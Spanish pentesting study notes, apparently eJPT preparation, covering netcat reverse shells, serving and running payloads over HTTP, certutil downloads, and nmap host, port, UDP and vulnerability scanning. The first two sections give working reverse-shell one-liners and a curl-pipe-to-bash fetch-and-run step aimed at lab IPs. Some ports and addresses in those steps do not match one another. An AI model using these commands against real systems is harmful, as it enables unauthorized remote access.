# 01. Reverse Shells con Netcat

## ¿Qué es Netcat?

Netcat (`nc`) es una herramienta de red que permite leer y escribir datos a través de conexiones TCP/UDP. En pentesting se utiliza para transferir archivos, hacer port scanning y — principalmente — establecer shells remotas.

## ¿Qué es una Reverse Shell?

Una **reverse shell** es una técnica donde la **máquina víctima inicia la conexión** hacia el atacante, no al revés. Esto permite evadir firewalls que bloquean conexiones entrantes hacia la víctima, pero permiten conexiones salientes.

```
Atacante (escucha) ←──── Víctima (conecta)
```

## Flujo de ataque

### 1. Conocer tu IP de atacante

```bash
ip a
hostname -I
```

### 2. Ponerse en escucha en la máquina atacante

```bash
nc -nlvp 443
```

| Flag | Significado           |
| ---- | --------------------- |
| `-n` | Sin resolución DNS    |
| `-l` | Modo escucha (listen) |
| `-v` | Verbose               |
| `-p` | Puerto a usar         |

> **Nota:** Se usa el puerto 443 porque simula tráfico HTTPS legítimo, reduciendo la probabilidad de ser bloqueado por el firewall.

### 3. Ejecutar en la máquina víctima

```bash
sh -i >& /dev/tcp/192.168.18.32/443 0>&1
```

Este comando redirige `stdin`, `stdout` y `stderr` de una shell hacia tu IP mediante TCP. Una vez que la víctima lo ejecuta, recibirás la shell en tu listener.

# 02. Compartir Archivos con Servidor HTTP en Python + Reverse Shell

### 1. Crear el payload

```bash
nano payload.sh
```

Dentro del archivo, escribe lo siguiente:

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.18.32/443 0>&1
```

Guarda el archivo con `Ctrl + O` y cierra el editor con `Ctrl + X`.

### 2. Levantar el servidor HTTP en la máquina atacante

```bash
python3 -m http.server 80
```

Esto levanta un servidor web en el puerto 80, permitiendo que otras máquinas descarguen archivos desde tu equipo.

### 3. Ejecutar el payload desde la máquina víctima

```bash
curl http://192.168.18.25:443/payload.sh | bash
```

Este comando descarga el script desde la máquina atacante y lo ejecuta directamente en la víctima.

### 4. Escuchar la conexión entrante

En la máquina atacante, ejecuta:

```bash
sudo nc -nlvp 445
```

Cuando la víctima ejecute el payload, recibirás la shell en este listener.

# 03. Compartir Archivos por Red en Máquinas Windows

### 1. Crear el archivo a compartir

```bash
touch compartir.mp4
```

### 2. Verificar tu IP en la máquina atacante

```bash
ifconfig
```

Anota la dirección IP que usarás en el siguiente paso.

### 3. Levantar el servidor HTTP

```bash
python3 -m http.server 80
```

### 4. Descargar el archivo desde Windows

Abre el `cmd` en la máquina Windows y ejecuta:

```cmd
certutil -split -urlcache -f http://192.168.18.25/compartir.mp4 compartir.mp4
```

Este comando descarga el archivo desde la máquina atacante y lo guarda localmente con el mismo nombre.

# 04. Reconocimiento de Red

Antes de escanear necesitamos saber en qué interfaz y red estamos:

```bash
ifconfig
```

Busca tu interfaz activa (ej. `eth0`) y el rango de red (ej. `192.168.1.0/24`).

## arp-scan

Descubre equipos en tu segmento enviando paquetes ARP — trabaja en capa 2, más rápido que nmap para redes locales:

```bash
arp-scan -I eth0 --localnet
```

## netdiscover

Alternativa pasiva/activa, útil en entornos virtuales (VirtualBox/VMware):

```bash
netdiscover -i eth0 -r 192.168.1.0/24
```

## nmap

El más completo — permite escanear y exportar resultados:

```bash
# Escaneo de hosts activos (sin escaneo de puertos)
nmap -sn 192.168.1.0/24

# Exportar a archivo
nmap -sn 192.168.1.0/24 -oN hosts_activos.txt
```

> `-sn` = ping scan. Rápido para descubrir qué IPs están activas antes de profundizar.

## Identificar SO por TTL

Con `ping` puedes inferir el sistema operativo de un host:

```bash
ping -c 1 192.168.1.25
```

Fíjate en el valor `ttl` de la respuesta:

| TTL | Sistema Operativo |
| --- | ----------------- |
| 64  | Linux / Unix      |
| 128 | Windows           |

> El TTL real puede ser menor por los saltos intermedios — lo importante es si se acerca más a 64 o a 128.

## Flujo recomendado

```bash
# 1. Identificar tu red
ifconfig

# 2. Descubrir hosts activos (elige uno)
arp-scan -I eth0 --localnet
netdiscover -i eth0 -r 192.168.1.0/24
nmap -sn 192.168.1.0/24 -oN hosts_activos.txt

# 3. Identificar SO por TTL
ping -c 1 <IP_objetivo>

```

# 05. Escaneo de Puertos con Nmap

Nmap es la herramienta estándar para descubrir puertos abiertos, servicios y versiones en un host objetivo.

## Escaneo básico

```bash
nmap 192.168.1.25
```

Escanea los 1000 puertos más comunes usando TCP SYN scan. Útil para un reconocimiento rápido.

## Escaneo completo

```bash
nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 192.168.1.25 -oN escaneo.txt
```

| Flag              | Descripción                                                                    |
| ----------------- | ------------------------------------------------------------------------------ |
| `-p-`             | Escanea los 65535 puertos                                                      |
| `--open`          | Muestra solo puertos abiertos                                                  |
| `-sS`             | Realiza un escaneo SYN, también conocido como "escaneo sigiloso" o "half-open" |
| `-sC`             | Ejecuta scripts por defecto de NSE                                             |
| `-sV`             | Detecta versión del servicio                                                   |
| `--min-rate 2000` | Mínimo 2000 paquetes/segundo (más rápido)                                      |
| `-n`              | Sin resolución DNS                                                             |
| `-vvv`            | Verbose máximo — muestra resultados en tiempo real                             |
| `-Pn`             | Omite el ping previo (útil si el host bloquea ICMP)                            |
| `-oN escaneo.txt` | Guarda el resultado en formato normal                                          |

> En CTFs y labs usar `--min-rate 5000` para más velocidad. En entornos reales bajar a `--min-rate 500` para no saturar la red. Para el examen eJPT usar `--min-rate 2000` aunque vaya lento poner.

## Otros formatos de exportación

```bash
-oN escaneo.txt    # Formato normal (legible)
-oG escaneo.gnmap  # Formato grepeable
-oX escaneo.xml    # Formato XML
-oA escaneo        # Genera los 3 formatos a la vez
```

## Flujo recomendado

```bash
# 1. Escaneo rápido para ver qué puertos están abiertos
nmap -p- --open --min-rate 5000 -Pn -n 192.168.1.25 -oN puertos.txt

# 2. Escaneo detallado solo sobre los puertos encontrados
nmap -p 22,80,443 -sC -sV -Pn 192.168.1.25 -oN servicios.txt
```

Separar el escaneo en dos pasos es más eficiente — el primero es rápido y el segundo profundiza solo donde hay algo interesante.

# 06. Detectar Vulnerabilidades con Nmap

Nmap tiene un motor de scripts llamado **NSE (Nmap Scripting Engine)** que permite ejecutar checks automáticos sobre puertos específicos. El script `vuln` agrupa todos los scripts de detección de vulnerabilidades conocidas.

```bash
nmap --script "vuln" -p 445 192.168.1.25
```

| Flag              | Descripción                                    |
| ----------------- | ---------------------------------------------- |
| `--script "vuln"` | Ejecuta todos los scripts de la categoría vuln |
| `-p 445`          | Solo sobre el puerto 445 (SMB)                 |

Puedes aplicarlo a varios puertos a la vez:

```bash
nmap --script "vuln" -p 21,22,80,443,445 192.168.1.25
```

O a todos los puertos abiertos que encontraste previamente:

```bash
nmap --script "vuln" -p 22,80,445 192.168.1.25 -oN vulns.txt
```

> En el eJPT es muy útil correrlo sobre SMB (445) y FTP (21) — son los servicios que más vulnerabilidades tienen en los labs.

Otros scripts útiles por servicio:

```bash
# SMB
nmap --script smb-vuln* -p 445 192.168.1.25

# FTP
nmap --script ftp-vuln* -p 21 192.168.1.25

# HTTP
nmap --script http-vuln* -p 80,443 192.168.1.25
```

# 07. Escaneo de Puertos bajo el Protocolo UDP

La mayoría de escaneos son TCP, pero servicios como **SNMP (161)**, **DNS (53)** o **TFTP (69)** corren sobre UDP. Nmap no los detecta con un escaneo TCP normal.

```bash
nmap -sU --top-ports 200 --min-rate 5000 -Pn 192.168.0.17
```

| Flag              | Descripción                             |
| ----------------- | --------------------------------------- |
| `-sU`             | UDP scan                                |
| `--top-ports 200` | Escanea los 200 puertos UDP más comunes |
| `--min-rate 5000` | Velocidad mínima de paquetes            |
| `-Pn`             | Omite el ping previo                    |

> El escaneo UDP es mucho más lento que TCP porque no hay handshake — por eso se limita a los top ports en vez de los 65535.

Servicios UDP que vale la pena revisar en el eJPT:

| Puerto | Servicio | Por qué importa                       |
| ------ | -------- | ------------------------------------- |
| 161    | SNMP     | Puede exponer información del sistema |
| 53     | DNS      | Zone transfer, subdominios            |
| 69     | TFTP     | Transferencia de archivos sin auth    |
| 123    | NTP      | Amplification attacks                 |

```bash
# Escaneo dirigido a puertos UDP específicos
nmap -sU -p 161,53,69 192.168.0.17 -sV -oN udp_scan.txt
```
